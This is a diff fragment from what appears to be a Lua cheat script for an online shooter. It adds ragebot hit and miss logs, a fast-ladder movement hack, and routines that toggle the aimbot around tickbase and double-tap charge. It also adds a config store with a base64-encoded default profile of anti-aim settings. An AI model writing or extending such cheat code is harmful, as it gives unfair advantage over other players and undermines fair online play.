+					{ 200, 200, 200, ' [hc: ' }, { info.hit[1], info.hit[2], info.hit[3], info.aimed_hitchance }, { 200, 200, 200, ' | safety: ' }, { info.hit[1], info.hit[2], info.hit[3], shot_logger[e.id].safety },
+					{ 200, 200, 200, ' | bt: ' }, { info.hit[1], info.hit[2], info.hit[3], shot_logger[e.id].history },
+					{ 200, 200, 200, ']' })
+end
+
+
+
+shot_logger.on_aim_miss = function(e)
+    if not lua_menu.visuals.ragebot_logs:get('Console') then return end
+
+    local me = entity.get_local_player()
+    local info = {
+        prefix = {lua_menu.visuals.ragebot_logs_miss:get()},
+        hit = {lua_menu.visuals.ragebot_logs_miss:get()},
+        name = entity.get_player_name(e.target),
+        hitgroup = shot_logger.hitboxes[e.hitgroup + 1] or '?',
+        flags = string.format('%s', _G.table.concat(shot_logger.generate_flags(shot_logger[e.id]))),
+        aimed_hitgroup = shot_logger.hitboxes[shot_logger[e.id].original.hitgroup + 1] or '?',
+        aimed_hitchance = string.format('%d%%', math.floor(shot_logger[e.id].original.hit_chance + 0.5)),
+        hp = math.max(0, entity.get_prop(e.target, 'm_iHealth')),
+        reason = e.reason == '?' and (shot_logger[e.id].total_hits ~= entity.get_prop(me, 'm_totalHitsOnServer') and 'damage rejection' or 'resolver') or e.reason,
+        spread_angle = string.format('%.2f°', shot_logger.get_inaccuracy_tick(shot_logger[e.id], globals.tickcount())),
+        correction = string.format('%d:%d°', shot_logger[e.id].correction and 1 or 0, (shot_logger[e.id].feet_yaw < 10 and shot_logger[e.id].feet_yaw > -10) and 0 or shot_logger[e.id].feet_yaw)
+    }
+
+    shot_logger.add(
+        {info.prefix[1], info.prefix[2], info.prefix[3], 'calamity'}, {134, 134, 134, ' » '}, 
+        {200, 200, 200, 'missed shot at '}, {info.hit[1], info.hit[2], info.hit[3], info.name}, 
+        {200, 200, 200, ' in the '}, {info.hit[1], info.hit[2], info.hit[3], info.hitgroup}, 
+        {200, 200, 200, ' due to '}, {info.hit[1], info.hit[2], info.hit[3], info.reason},
+        {200, 200, 200, ' [hc: '}, {info.hit[1], info.hit[2], info.hit[3], info.aimed_hitchance}, 
+        {200, 200, 200, ' | safety: '}, {info.hit[1], info.hit[2], info.hit[3], shot_logger[e.id].safety},
+        {200, 200, 200, ' | bt: '}, {info.hit[1], info.hit[2], info.hit[3], shot_logger[e.id].history},
+        {200, 200, 200, ']'}
+    )
+end
+
+client.set_event_callback('aim_fire', shot_logger.on_aim_fire)
+client.set_event_callback('aim_miss', shot_logger.on_aim_miss)
+client.set_event_callback('aim_hit', shot_logger.on_aim_hit)
+client.set_event_callback('bullet_impact', shot_logger.bullet_impact)
+
+local logs = {}
+local function ragebot_logs()
+    local offset, x, y = 0, screen[1] / 2, screen[2] / 1.4
+    for idx, data in ipairs(logs) do
+        if (((globals.curtime()/2) * 2.0) - data[3]) < 4.0 and not (#logs > 5 and idx < #logs - 5) then
+            data[2] = math.lerp(data[2], 255, 10)
+        else
+            data[2] = math.lerp(data[2], 0, 10)
+        end
+        offset = offset - 40 * (data[2] / 255)
+
+        local r, g, b = unpack(data[4])
+        text_size_x, text_sise_y = renderer.measure_text("", data[1])
+        renderer.glow_module(x - 7 - text_size_x / 2, y - offset-4, text_size_x + 13, 20, 4, 8, {r, g, b, data[2]/2}, {20, 20, 20, data[2]/2})
+        renderer.text(x - 1 - text_size_x / 2, y - offset+1, 255, 255, 255, data[2], "", 0, data[1])
+        if data[2] < 0.1 or not entity.get_local_player() then table.remove(logs, idx) end
+    end
+end
+
+renderer.log = function(text, color)
+    table.insert(logs, { text, 0, ((globals.curtime() / 2) * 2.0), color})
+end
+
+local hitgroup_names = {'generic', 'head', 'chest', 'stomach', 'left arm', 'right arm', 'left leg', 'right leg', 'neck', '?', 'gear'}
+
+local function aim_hit(e)
+    breaker.tickbase_check = false
+    breaker.cmd = 0
+    breaker.defensive = 0
+    breaker.defensive_check = 0
+    if not lua_menu.visuals.ragebot_logs:get('Screen') then return end
+    local group = hitgroup_names[e.hitgroup + 1] or '?'
+    renderer.log(string.format('Hit %s in the %s for %d damage', entity.get_player_name(e.target) or "amigus", group, e.damage or 0), {lua_menu.visuals.ragebot_logs_hit:get()})
+end
+client.set_event_callback('aim_hit', aim_hit)
+
+local function aim_miss(e)
+    breaker.tickbase_check = false
+    breaker.cmd = 0
+    breaker.defensive = 0
+    breaker.defensive_check = 0
+    if not lua_menu.visuals.ragebot_logs:get('Screen') then return end
+    local group = hitgroup_names[e.hitgroup + 1] or '?'
+    renderer.log(string.format('Missed %s in the %s due to %s', entity.get_player_name(e.target) or "amigus", group, e.reason or "?"), {lua_menu.visuals.ragebot_logs_miss:get()})
+end
+client.set_event_callback('aim_miss', aim_miss)
+
+local function fastladder(e)
+    local me = entity.get_local_player()
+    if entity.get_prop(me, "m_MoveType") == 9 then 
+        local forward = vector(entity.get_prop(me, "m_vecLadderNormal"));
+        if forward:lengthsqr() == 0 then return end
+
+        local view = vector(client.camera_angles())
+        local angle = vector(forward:angles())
+
+        local delta_yaw = angle.y - view.y + 180
+        local delta_pitch = angle.x - view.x
+
+        delta_yaw = normalize_yaw(delta_yaw)
+        delta_pitch = math.clamp(delta_pitch, -89, 89)
+
+        local abs_yaw = math.abs(delta_yaw)
+
+        local pitch = 89
+        local yaw_offset = -90
+
+        local is_looking_down = delta_pitch < -45
+        local is_looking_to_right = delta_yaw > 0
+
+        local is_sidemove = e.sidemove > 0
+        local is_forwardmove = e.forwardmove > 0
+
+            -- sideways
+        if abs_yaw > 70 and abs_yaw < 135 then
+            if e.forwardmove ~= 0 or e.sidemove == 0 then
+                return;
+            end
+
+            if not is_looking_to_right then
+                yaw_offset = -yaw_offset
+            end
+
+            if is_looking_to_right then
+                is_sidemove = not is_sidemove
+            end
+
+            e.in_back = is_sidemove and 1 or 0
+            e.in_forward = is_sidemove and 0 or 1
+
+            if is_looking_to_right then
+                is_sidemove = not is_sidemove
+            end
+
+            e.in_moveleft = is_sidemove and 1 or 0
+            e.in_moveright = is_sidemove and 0 or 1
+
+            e.pitch = pitch
+            e.yaw = normalize_yaw(angle.y + yaw_offset)
+
+            return
+        end
+
+            -- straight
+        if e.sidemove ~= 0 or e.forwardmove == 0 then
+            return
+        end
+
+        if not is_looking_to_right then
+            yaw_offset = -yaw_offset
+        end
+
+        if not is_looking_down then
+            is_forwardmove = not is_forwardmove
+        end
+
+        e.in_back = is_forwardmove and 0 or 1
+        e.in_forward = is_forwardmove and 1 or 0
+
+        if not is_looking_to_right then
+            is_forwardmove = not is_forwardmove
+        end
+
+        e.in_moveleft = is_forwardmove and 1 or 0
+        e.in_moveright = is_forwardmove and 0 or 1
+
+        e.pitch = pitch
+        e.yaw = normalize_yaw(angle.y + yaw_offset)
+    end
+end
+
+local function lol_predict(value)
+    if value then
+        cvar.sv_max_allowed_net_graph:set_int(2)
+        cvar.cl_interpolate:set_int(0)
+        cvar.cl_interp_ratio:set_int(1)
+        cvar.cl_interp:set_float(0.031000)
+    else
+        cvar.sv_max_allowed_net_graph:set_int(1)
+        cvar.cl_interpolate:set_int(1)
+        cvar.cl_interp_ratio:set_int(2)
+        cvar.cl_interp:set_float(0.015626)
+    end
+end
+
+lol_predict(lua_menu.misc.predict:get())
+
+lua_menu.misc.predict:set_callback(function(self)
+    lol_predict(self:get())
+end)
+
+local function check_charge()
+    local lp = entity.get_local_player()
+    local m_nTickBase = entity.get_prop(lp, 'm_nTickBase')
+    local client_latency = client.latency()
+    local shift = math.floor(m_nTickBase - globals.tickcount() - 3 - toticks(client_latency) * .5 + .5 * (client_latency * 10))
+    local wanted = -14 + (ui.get(ref.doubletap.fakelag_limit) - 1) + 3
+    return shift <= wanted
+end
+
+local function defensive_fix(cmd)
+    local lp = entity.get_local_player()
+    if not lp or not entity.is_alive(lp) then return end
+    local on_ground = bit.band(entity.get_prop(lp, 'm_fFlags'), 1) == 1
+    if on_ground and ui.get(ref.peek[1]) and ui.get(ref.peek[2]) and check_charge() and cmd.quick_stop then
+        cmd.in_speed = 1
+    end
+end
+
+local is_hittable = false
+
+local function unsafe_charge(cmd)
+    local lp = entity.get_local_player()
+    if not lp or not entity.is_alive(lp) then return end
+    local my_weapon = entity.get_player_weapon(lp)
+    if not my_weapon then return end
+
+    local can_shoot = entity.get_prop(my_weapon, "m_flNextPrimaryAttack") < globals.curtime()
+
+    local threat = client.current_threat()
+    local in_air = bit.band(entity.get_prop(lp, 'm_fFlags'), 1) == 0
+    
+    if threat then
+        is_hittable = bit.band(entity.get_esp_data(threat).flags, bit.lshift(1, 11)) == 2048
+    else
+        is_hittable = false
+    end
+
+    if is_hittable and not check_charge() and ui.get(ref.doubletap.main[1]) and ui.get(ref.doubletap.main[2]) then
+        if in_air then
+            ui.set(ref.aimbot, false)
+        elseif lua_menu.misc.unsafe_type:get() == 'Alternative' and not can_shoot then
+            ui.set(ref.aimbot, false)
+        else
+            ui.set(ref.aimbot, true)
+        end
+    else
+        ui.set(ref.aimbot, true)
+    end
+end
+
+local function thirdperson(value)
+    if value ~= nil then
+        cvar.cam_idealdist:set_int(value)
+    end
+end
+
+local function aspectratio(value)
+    if value then
+        cvar.r_aspectratio:set_float(value)
+    end
+end
+
+
+local config_cfg = {lua_menu, antiaim_system}
+
+local package, data, encrypted, decrypted = pui.setup(config_cfg), "", "", ""
+config = {}
+
+local cfg_system = {}
+configs_db = database.read(lua_db.configs) or { }
+configs_db.cfg_list = configs_db.cfg_list or {{'Default', 'W3sidmlzdWFscyI6eyJkZWZlbnNpdmVfd2luZG93X3R5cGUiOiJNb2Rlcm4iLCJjcm9zc19jb2xvciI6dHJ1ZSwiZGVmZW5zaXZlX3dpbmRvd19jIjoiI0ZGRkZGRkZGIiwicmFnZWJvdF9sb2dzIjpbIkNvbnNvbGUiLCJTY3JlZW4iLCJ+Il0sInJhZ2Vib3RfbG9nc19taXNzIjoiI0JENjM2MEZGIiwiY3Jvc3NfY29sb3JfYyI6IiM2NDY0NjRGRiIsInJhZ2Vib3RfbG9nc19oaXQiOiIjNzRCRDYwRkYiLCJjcm9zc19pbmQiOnRydWUsImNyb3NzX2luZF9jIjoiI0M4QzhDOEZGIiwia2V5X2NvbG9yIjp0cnVlLCJ2ZWxvY2l0eV93aW5kb3dfYyI6IiNGRkZGRkZGRiIsImtleV9jb2xvcl9jIjoiI0ZGRkZGRkZGIiwiY3Jvc3NfaW5kX3R5cGUiOiJBbHRlcm5hdGl2ZSIsImRlZmVuc2l2ZV93aW5kb3ciOnRydWUsInZlbG9jaXR5X3dpbmRvd190eXBlIjoiTW9kZXJuIiwidmVsb2NpdHlfd2luZG93Ijp0cnVlfSwibWlzYyI6eyJwcmVkaWN0IjpmYWxzZSwiZmFzdF9sYWRkZXIiOnRydWUsInVuc2FmZV9yZWNoYXJnZSI6dHJ1ZSwidW5zYWZlX3R5cGUiOiJBbHRlcm5hdGl2ZSIsImFzcGVjdHJhdGlvIjp0cnVlLCJhaXJxc2JpbmQiOlsxLDYsIn4iXSwiY29uc29sZSI6dHJ1ZSwiYXNwZWN0cmF0aW9fdmFsdWUiOjEzMywiZGVmZW5zaXZlX2ZpeCI6dHJ1ZSwiYWlycXMiOnRydWUsInRoaXJkX3BlcnNvbiI6dHJ1ZSwiYW50aWJhY2tzdGFiIjp0cnVlLCJ0aGlyZF9wZXJzb25fdmFsdWUiOjQ1fSwibWFpbiI6eyJ0YWIiOiLimaYgQ29uZmlnIOKZpiJ9LCJhbnRpYWltIjp7InRhYiI6Ik1haW4iLCJkZWZlbnNpdmVfY29uZGl0aW9uIjpbIn4iXSwieWF3X29wdGlvbnMiOlsifiJdLCJrZXlfbGVmdCI6WzEsOTAsIn4iXSwic2FmZV9oZWFkIjpbIkFpcitDIEtuaWZlIiwiQWlyK0MgWmV1cyIsIkhlaWdodCBEaWZmZXJlbmNlIiwifiJdLCJmcl9vcHRpb25zIjpbIkZyZWVzdGFuZGluZyBPbiBRdWljayBQZWVrIiwifiJdLCJmcl9kaXNhYmxlcnMiOlsifiJdLCJhYV9vdmVycmlkZSI6WyJPbiBXYXJtdXAiLCJObyBFbmVtaWVzIEFsaXZlIiwifiJdLCJ5YXdfYmFzZSI6IkF0IHRhcmdldHMiLCJlZGdlX3lhdyI6WzEsMCwifiJdLCJrZXlfZm9yd2FyZCI6WzEsMCwifiJdLCJtYW51YWxfZGlyZWN0aW9uIjpmYWxzZSwiaGVpZ2h0X2RpZmZlcmVuY2UiOjIwMCwiY29uZGl0aW9uIjoiV2Fsa2luZyIsInlhd19kaXJlY3Rpb24iOnRydWUsImRlZmVuc2l2ZV90cmlnZ2VycyI6WyJ+Il0sImZyZWVzdGFuZGluZyI6WzEsMCwifiJdLCJrZXlfcmlnaHQiOlsxLDY3LCJ+Il19LCJjb25maWciOnsibGlzdCI6MSwibmFtZSI6IiJ9fSxbeyJlbmFibGUiOmZhbHNlLCJkZWZfbW9kX3JhbmRvbSI6MCwibW9kX3R5cGUiOiJPZmYiLCJ5YXdfb2Zmc2V0IjowLCJwZWVrX2RlZiI6ZmFsc2UsImRlZmVuc2l2ZV9waXRjaCI6Ik9mZiIsImRlbGF5X3JhbmRvbSI6MSwiYm9keV9zbGlkZXIiOjAsImJvZHlfeWF3X3R5cGUiOiJPZmYiLCJ5YXdfcmFuZG9tIjowLCJkZWZfYm9keV9zbGlkZXIiOjAsImRlZmVuc2l2ZSI6ZmFsc2UsIm1vZF9kbSI6MCwiZGVmX21vZF9kbSI6MCwiZGVmZW5zaXZlX3NlbGVjdCI6WyJ+Il0sInlhd19yaWdodCI6MCwiZm9yY2VfZGVmIjpmYWxzZSwieWF3X2RlbGF5IjoxLCJkZWZfYm9keV95YXdfdHlwZSI6Ik9mZiIsImRlZmVuc2l2ZV95YXciOiJPZmYiLCJkZWZfbW9kX3R5cGUiOiJPZmYiLCJ5YXdfdmFsdWUiOjAsIm1vZF9yYW5kb20iOjAsInNwaW5fb2Zmc2V0IjozNjAsInNwaW5fc3BlZWQiOjEwLCJwaXRjaF9zcGVlZCI6MCwieWF3X292ZXJyaWRlIjpmYWxzZSwieWF3X2xlZnQiOjAsInBpdGNoX3ZhbHVlIjowLCJwaXRjaCI6IkRvd24ifSx7ImVuYWJsZSI6dHJ1ZSwiZGVmX21vZF9yYW5kb20iOjAsIm1vZF90eXBlIjoiU2tpdHRlciIsInlhd19vZmZzZXQiOjMsInBlZWtfZGVmIjpmYWxzZSwiZGVmZW5zaXZlX3BpdGNoIjoiT2ZmIiwiZGVsYXlfcmFuZG9tIjoxLCJib2R5X3NsaWRlciI6MSwiYm9keV95YXdfdHlwZSI6IkppdHRlciIsInlhd19yYW5kb20iOjAsImRlZl9ib2R5X3NsaWRlciI6MSwiZGVmZW5zaXZlIjp0cnVlLCJtb2RfZG0iOi0zMywiZGVmX21vZF9kbSI6LTUwLCJkZWZlbnNpdmVfc2VsZWN0IjpbIkppdHRlciIsIkJvZHkgWWF3IiwifiJdLCJ5YXdfcmlnaHQiOjAsImZvcmNlX2RlZiI6dHJ1ZSwieWF3X2RlbGF5IjoxLCJkZWZfYm9keV95YXdfdHlwZSI6IkppdHRlciIsImRlZmVuc2l2ZV95YXciOiJPZmZzZXQiLCJkZWZfbW9kX3R5cGUiOiJTa2l0dGVyIiwieWF3X3ZhbHVlIjozLCJtb2RfcmFuZG9tIjowLCJzcGluX29mZnNldCI6MzYwLCJzcGluX3NwZWVkIjoxMCwicGl0Y2hfc3BlZWQiOjEsInlhd19vdmVycmlkZSI6ZmFsc2UsInlhd19sZWZ0IjowLCJwaXRjaF92YWx1ZSI6ODksInBpdGNoIjoiRG93biJ9LHsiZW5hYmxlIjp0cnVlLCJkZWZfbW9kX3JhbmRvbSI6MCwibW9kX3R5cGUiOiJTa2l0dGVyIiwieWF3X29mZnNldCI6MywicGVla19kZWYiOmZhbHNlLCJkZWZlbnNpdmVfcGl0Y2giOiJPZmYiLCJkZWxheV9yYW5kb20iOjEsImJvZHlfc2xpZGVyIjoxLCJib2R5X3lhd190eXBlIjoiSml0dGVyIiwieWF3X3JhbmRvbSI6MCwiZGVmX2JvZHlfc2xpZGVyIjowLCJkZWZlbnNpdmUiOnRydWUsIm1vZF9kbSI6LTQwLCJkZWZfbW9kX2RtIjotNjUsImRlZmVuc2l2ZV9zZWxlY3QiOlsiSml0dGVyIiwifiJdLCJ5YXdfcmlnaHQiOjAsImZvcmNlX2RlZiI6dHJ1ZSwieWF3X2RlbGF5IjoxLCJkZWZfYm9keV95YXdfdHlwZSI6IkppdHRlciIsImRlZmVuc2l2ZV95YXciOiJPZmZzZXQiLCJkZWZfbW9kX3R5cGUiOiJTa2l0dGVyIiwieWF3X3ZhbHVlIjozLCJtb2RfcmFuZG9tIjowLCJzcGluX29mZnNldCI6MzYwLCJzcGluX3NwZWVkIjoxMCwicGl0Y2hfc3BlZWQiOjIsInlhd19vdmVycmlkZSI6ZmFsc2UsInlhd19sZWZ0IjowLCJwaXRjaF92YWx1ZSI6ODksInBpdGNoIjoiRG93biJ9LHsiZW5hYmxlIjp0cnVlLCJkZWZfbW9kX3JhbmRvbSI6MCwibW9kX3R5cGUiOiJTa2l0dGVyIiwieWF3X29mZnNldCI6MTksInBlZWtfZGVmIjpmYWxzZSwiZGVmZW5zaXZlX3BpdGNoIjoiT2ZmIiwiZGVsYXlfcmFuZG9tIjoxLCJib2R5X3NsaWRlciI6MSwiYm9keV95YXdfdHlwZSI6IkppdHRlciIsInlhd19yYW5kb20iOjAsImRlZl9ib2R5X3NsaWRlciI6MCwiZGVmZW5zaXZlIjp0cnVlLCJtb2RfZG0iOi0zNSwiZGVmX21vZF9kbSI6LTUwLCJkZWZlbnNpdmVfc2VsZWN0IjpbIkppdHRlciIsIn4iXSwieWF3X3JpZ2h0IjozLCJmb3JjZV9kZWYiOnRydWUsInlhd19kZWxheSI6MSwiZGVmX2JvZHlfeWF3X3R5cGUiOiJPZmYiLCJkZWZlbnNpdmVfeWF3IjoiT2Zmc2V0IiwiZGVmX21vZF90eXBlIjoiU2tpdHRlciIsInlhd192YWx1ZSI6MywibW9kX3JhbmRvbSI6MCwic3Bpbl9vZmZzZXQiOjM2MCwic3Bpbl9zcGVlZCI6MTAsInBpdGNoX3NwZWVkIjowLCJ5YXdfb3ZlcnJpZGUiOnRydWUsInlhd19sZWZ0IjozLCJwaXRjaF92YWx1ZSI6MCwicGl0Y2giOiJEb3duIn0seyJlbmFibGUiOnRydWUsImRlZl9tb2RfcmFuZG9tIjowLCJtb2RfdHlwZSI6IlNraXR0ZXIiLCJ5YXdfb2Zmc2V0IjoxNywicGVla19kZWYiOmZhbHNlLCJkZWZlbnNpdmVfcGl0Y2giOiJPZmYiLCJkZWxheV9yYW5kb20iOjEsImJvZHlfc2xpZGVyIjoxLCJib2R5X3lhd190eXBlIjoiSml0dGVyIiwieWF3X3JhbmRvbSI6MCwiZGVmX2JvZHlfc2xpZGVyIjoxLCJkZWZlbnNpdmUiOnRydWUsIm1vZF9kbSI6LTMzLCJkZWZfbW9kX2RtIjotNTEsImRlZmVuc2l2ZV9zZWxlY3QiOlsiSml0dGVyIiwiQm9keSBZYXciLCJ+Il0sInlhd19yaWdodCI6MywiZm9yY2VfZGVmIjp0cnVlLCJ5YXdfZGVsYXkiOjEsImRlZl9ib2R5X3lhd190eXBlIjoiSml0dGVyIiwiZGVmZW5zaXZlX3lhdyI6Ik9mZnNldCIsImRlZl9tb2RfdHlwZSI6IlNraXR0ZXIiLCJ5YXdfdmFsdWUiOjMsIm1vZF9yYW5kb20iOjAsInNwaW5fb2Zmc2V0IjozNjAsInNwaW5fc3BlZWQiOjEwLCJwaXRjaF9zcGVlZCI6LTEsInlhd19vdmVycmlkZSI6dHJ1ZSwieWF3X2xlZnQiOjMsInBpdGNoX3ZhbHVlIjo4OSwicGl0Y2giOiJEb3duIn0seyJlbmFibGUiOnRydWUsImRlZl9tb2RfcmFuZG9tIjowLCJtb2RfdHlwZSI6IlNraXR0ZXIiLCJ5YXdfb2Zmc2V0IjoxNiwicGVla19kZWYiOmZhbHNlLCJkZWZlbnNpdmVfcGl0Y2giOiJPZmYiLCJkZWxheV9yYW5kb20iOjEsImJvZHlfc2xpZGVyIjoxLCJib2R5X3lhd190eXBlIjoiSml0dGVyIiwieWF3X3JhbmRvbSI6MCwiZGVmX2JvZHlfc2xpZGVyIjoxLCJkZWZlbnNpdmUiOnRydWUsIm1vZF9kbSI6LTMzLCJkZWZfbW9kX2RtIjotNTEsImRlZmVuc2l2ZV9zZWxlY3QiOlsiSml0dGVyIiwiQm9keSBZYXciLCJ+Il0sInlhd19yaWdodCI6MTAsImZvcmNlX2RlZiI6dHJ1ZSwieWF3X2RlbGF5IjoxLCJkZWZfYm9keV95YXdfdHlwZSI6IkppdHRlciIsImRlZmVuc2l2ZV95YXciOiJPZmZzZXQiLCJkZWZfbW9kX3R5cGUiOiJTa2l0dGVyIiwieWF3X3ZhbHVlIjoxMCwibW9kX3JhbmRvbSI6MCwic3Bpbl9vZmZzZXQiOjM2MCwic3Bpbl9zcGVlZCI6MTAsInBpdGNoX3NwZWVkIjowLCJ5YXdfb3ZlcnJpZGUiOnRydWUsInlhd19sZWZ0IjoxMCwicGl0Y2hfdmFsdWUiOjAsInBpdGNoIjoiRG93biJ9LHsiZW5hYmxlIjp0cnVlLCJkZWZfbW9kX3JhbmRvbSI6MTAsIm1vZF90eXBlIjoiQ2VudGVyIiwieWF3X29mZnNldCI6NiwicGVla19kZWYiOmZhbHNlLCJkZWZlbnNpdmVfcGl0Y2giOiJDdXN0b20iLCJkZWxheV9yYW5kb20iOjEsImJvZHlfc2xpZGVyIjoxLCJib2R5X3lhd190eXBlIjoiSml0dGVyIiwieWF3X3JhbmRvbSI6MTIsImRlZl9ib2R5X3NsaWRlciI6MSwiZGVmZW5zaXZlIjp0cnVlLCJtb2RfZG0iOjU1LCJkZWZfbW9kX2RtIjowLCJkZWZlbnNpdmVfc2VsZWN0IjpbIkppdHRlciIsIkJvZHkgWWF3IiwifiJdLCJ5YXdfcmlnaHQiOjcsImZvcmNlX2RlZiI6dHJ1ZSwieWF3X2RlbGF5IjoxLCJkZWZfYm9keV95YXdfdHlwZSI6IlN0YXRpYyIsImRlZmVuc2l2ZV95YXciOiJTcGluIiwiZGVmX21vZF90eXBlIjoiT2ZmIiwieWF3X3ZhbHVlIjoxODAsIm1vZF9yYW5kb20iOjEwLCJzcGluX29mZnNldCI6MzYwLCJzcGluX3NwZWVkIjo5LCJwaXRjaF9zcGVlZCI6MCwieWF3X292ZXJyaWRlIjpmYWxzZSwieWF3X2xlZnQiOjcsInBpdGNoX3ZhbHVlIjotODksInBpdGNoIjoiRG93biJ9LHsiZW5hYmxlIjp0cnVlLCJkZWZfbW9kX3JhbmRvbSI6MTAsIm1vZF90eXBlIjoiQ2VudGVyIiwieWF3X29mZnNldCI6NiwicGVla19kZWYiOmZhbHNlLCJkZWZlbnNpdmVfcGl0Y2giOiJDdXN0b20iLCJkZWxheV9yYW5kb20iOjEsImJvZHlfc2xpZGVyIjoxLCJib2R5X3lhd190eXBlIjoiSml0dGVyIiwieWF3X3JhbmRvbSI6MTMsImRlZl9ib2R5X3NsaWRlciI6LTEsImRlZmVuc2l2ZSI6dHJ1ZSwibW9kX2RtIjo1MCwiZGVmX21vZF9kbSI6MCwiZGVmZW5zaXZlX3NlbGVjdCI6WyJKaXR0ZXIiLCJCb2R5IFlhdyIsIn4iXSwieWF3X3JpZ2h0IjoyMiwiZm9yY2VfZGVmIjp0cnVlLCJ5YXdfZGVsYXkiOjEsImRlZl9ib2R5X3lhd190eXBlIjoiU3RhdGljIiwiZGVmZW5zaXZlX3lhdyI6IlNwaW4iLCJkZWZfbW9kX3R5cGUiOiJPZmYiLCJ5YXdfdmFsdWUiOjE4MCwibW9kX3JhbmRvbSI6MTAsInNwaW5fb2Zmc2V0IjozNjAsInNwaW5fc3BlZWQiOjUsInBpdGNoX3NwZWVkIjowLCJ5YXdfb3ZlcnJpZGUiOmZhbHNlLCJ5YXdfbGVmdCI6MCwicGl0Y2hfdmFsdWUiOi04OSwicGl0Y2giOiJEb3duIn0seyJlbmFibGUiOmZhbHNlLCJkZWZfbW9kX3JhbmRvbSI6MCwibW9kX3R5cGUiOiJPZmYiLCJ5YXdfb2Zmc2V0IjowLCJwZWVrX2RlZiI6ZmFsc2UsImRlZmVuc2l2ZV9waXRjaCI6Ik9mZiIsImRlbGF5X3JhbmRvbSI6MSwiYm9keV9zbGlkZXIiOjAsImJvZHlfeWF3X3R5cGUiOiJPZmYiLCJ5YXdfcmFuZG9tIjowLCJkZWZfYm9keV9zbGlkZXIiOjAsImRlZmVuc2l2ZSI6ZmFsc2UsIm1vZF9kbSI6MCwiZGVmX21vZF9kbSI6MCwiZGVmZW5zaXZlX3NlbGVjdCI6WyJ+Il0sInlhd19yaWdodCI6MCwiZm9yY2VfZGVmIjpmYWxzZSwieWF3X2RlbGF5IjoxLCJkZWZfYm9keV95YXdfdHlwZSI6Ik9mZiIsImRlZmVuc2l2ZV95YXciOiJPZmYiLCJkZWZfbW9kX3R5cGUiOiJPZmYiLCJ5YXdfdmFsdWUiOjAsIm1vZF9yYW5kb20iOjAsInNwaW5fb2Zmc2V0IjozNjAsInNwaW5fc3BlZWQiOjEwLCJwaXRjaF9zcGVlZCI6MCwieWF3X292ZXJyaWRlIjpmYWxzZSwieWF3X2xlZnQiOjAsInBpdGNoX3ZhbHVlIjowLCJwaXRjaCI6Ik9mZiJ9LHsiZW5hYmxlIjp0cnVlLCJkZWZfbW9kX3JhbmRvbSI6MCwibW9kX3R5cGUiOiJPZmYiLCJ5YXdfb2Zmc2V0IjoxODAsInBlZWtfZGVmIjpmYWxzZSwiZGVmZW5zaXZlX3BpdGNoIjoiT2ZmIiwiZGVsYXlfcmFuZG9tIjoxLCJib2R5X3NsaWRlciI6MCwiYm9keV95YXdfdHlwZSI6IkppdHRlciIsInlhd19yYW5kb20iOjAsImRlZl9ib2R5X3NsaWRlciI6MCwiZGVmZW5zaXZlIjpmYWxzZSwibW9kX2RtIjoxMDYsImRlZl9tb2RfZG0iOjAsImRlZmVuc2l2ZV9zZWxlY3QiOlsifiJdLCJ5YXdfcmlnaHQiOjAsImZvcmNlX2RlZiI6dHJ1ZSwieWF3X2RlbGF5IjoxLCJkZWZfYm9keV95YXdfdHlwZSI6Ik9mZiIsImRlZmVuc2l2ZV95YXciOiJPZmYiLCJkZWZfbW9kX3R5cGUiOiJPZmYiLCJ5YXdfdmFsdWUiOjAsIm1vZF9yYW5kb20iOjAsInNwaW5fb2Zmc2V0IjozNjAsInNwaW5fc3BlZWQiOjEwLCJwaXRjaF9zcGVlZCI6MCwieWF3X292ZXJyaWRlIjpmYWxzZSwieWF3X2xlZnQiOjAsInBpdGNoX3ZhbHVlIjowLCJwaXRjaCI6Ik9mZiJ9LHsiZW5hYmxlIjp0cnVlLCJkZWZfbW9kX3JhbmRvbSI6MCwibW9kX3R5cGUiOiJPZmYiLCJ5YXdfb2Zmc2V0Ijo1LCJwZWVrX2RlZiI6ZmFsc2UsImRlZmVuc2l2ZV9waXRjaCI6IkN1c3RvbSIsImRlbGF5X3JhbmRvbSI6MSwiYm9keV9zbGlkZXIiOjEsImJvZHlfeWF3X3R5cGUiOiJTdGF0aWMiLCJ5YXdfcmFuZG9tIjowLCJkZWZfYm9keV9zbGlkZXIiOi0xLCJkZWZlbnNpdmUiOnRydWUsIm1vZF9kbSI6MCwiZGVmX21vZF9kbSI6MCwiZGVmZW5zaXZlX3NlbGVjdCI6WyJCb2R5IFlhdyIsIn4iXSwieWF3X3JpZ2h0IjowLCJmb3JjZV9kZWYiOnRydWUsInlhd19kZWxheSI6MSwiZGVmX2JvZHlfeWF3X3R5cGUiOiJTdGF0aWMiLCJkZWZlbnNpdmVfeWF3IjoiT2ZmIiwiZGVmX21vZF90eXBlIjoiT2ZmIiwieWF3X3ZhbHVlIjowLCJtb2RfcmFuZG9tIjowLCJzcGluX29mZnNldCI6MzYwLCJzcGluX3NwZWVkIjoxMCwicGl0Y2hfc3BlZWQiOjAsInlhd19vdmVycmlkZSI6ZmFsc2UsInlhd19sZWZ0IjowLCJwaXRjaF92YWx1ZSI6LTg5LCJwaXRjaCI6IkRvd24ifSx7ImVuYWJsZSI6dHJ1ZSwiZGVmX21vZF9yYW5kb20iOjAsIm1vZF90eXBlIjoiT2ZmIiwieWF3X29mZnNldCI6MjUsInBlZWtfZGVmIjpmYWxzZSwiZGVmZW5zaXZlX3BpdGNoIjoiQ3VzdG9tIiwiZGVsYXlfcmFuZG9tIjoxLCJib2R5X3NsaWRlciI6MSwiYm9keV95YXdfdHlwZSI6IlN0YXRpYyIsInlhd19yYW5kb20iOjAsImRlZl9ib2R5X3NsaWRlciI6MCwiZGVmZW5zaXZlIjp0cnVlLCJtb2RfZG0iOjAsImRlZl9tb2RfZG0iOjAsImRlZmVuc2l2ZV9zZWxlY3QiOlsifiJdLCJ5YXdfcmlnaHQiOjAsImZvcmNlX2RlZiI6dHJ1ZSwieWF3X2RlbGF5IjoxLCJkZWZfYm9keV95YXdfdHlwZSI6Ik9mZiIsImRlZmVuc2l2ZV95YXciOiJPZmZzZXQiLCJkZWZfbW9kX3R5cGUiOiJPZmYiLCJ5YXdfdmFsdWUiOjE4MCwibW9kX3JhbmRvbSI6MCwic3Bpbl9vZmZzZXQiOjM2MCwic3Bpbl9zcGVlZCI6MTAsInBpdGNoX3NwZWVkIjowLCJ5YXdfb3ZlcnJpZGUiOmZhbHNlLCJ5YXdfbGVmdCI6MCwicGl0Y2hfdmFsdWUiOjAsInBpdGNoIjoiRG93biJ9XV0='}}
+configs_db.menu_list = configs_db.menu_list or {'Default'}
+
